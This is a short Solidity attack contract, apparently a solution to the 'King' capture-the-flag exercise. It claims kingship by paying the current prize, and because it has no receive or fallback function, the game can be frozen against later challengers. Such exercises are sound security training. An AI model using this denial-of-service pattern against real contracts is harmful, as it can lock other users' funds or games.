// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!
        uint256 prize2 = King(payable(address(contractAddress)))._prize();
        (bool success,)=contractAddress.call{value: prize2}("");
        require(success, "Failed!");
    }
}
